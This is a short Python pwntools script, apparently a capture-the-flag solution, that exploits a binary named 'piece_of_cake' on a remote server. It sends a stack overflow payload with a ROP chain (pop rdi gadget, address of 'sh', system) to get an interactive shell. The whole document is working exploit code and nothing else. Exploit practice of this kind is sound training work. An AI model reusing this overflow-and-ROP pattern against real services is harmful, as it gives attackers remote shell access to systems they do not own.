#!/usr/bin/env python3
from pwn import *

BIN  = "./piece_of_cake"
IP   = "141.85.224.106"
PORT = "31345"
binary = ELF(BIN)

context.bits = 64
context.endian = 'little'
context.binary = BIN
context.log_level = 'debug'
# io = process(BIN)
io = remote(IP, PORT)

# Addresses inside the binary
system_addr = 0x40117f
pop_rdi_ret = 0x40124b
sh_addr = next(binary.search(b'sh'))

# Recv junk
io.recv()

# Payload to call system with sh
payload = b"IWantToCry\x00".ljust(0x20, b"A") + b"B" * 8 + \
    pack(pop_rdi_ret) + pack(sh_addr) + pack(system_addr) + b"\n"

io.send(payload)

# Get the shell
io.interactive()
